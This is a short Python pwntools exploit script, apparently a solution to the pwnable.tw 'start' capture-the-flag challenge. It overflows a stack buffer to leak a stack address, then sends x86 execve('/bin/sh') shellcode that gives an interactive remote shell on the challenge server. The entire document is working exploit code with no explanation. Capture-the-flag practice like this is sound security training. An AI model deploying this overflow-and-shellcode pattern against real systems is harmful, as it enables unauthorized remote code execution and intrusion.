from pwn import *

# r = remote("127.0.0.1", 8888)
r = remote("chall.pwnable.tw", 10000)

write_addr = 0x08048087
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

r.recvuntil(":")
payload = "a" * 20 + p32(write_addr)
r.send(payload)
stack_addr = u32(r.recv(4))
r.recv()
payload2 = "a" * 20 + p32(stack_addr + 20) + shellcode
r.send(payload2)

r.interactive() 
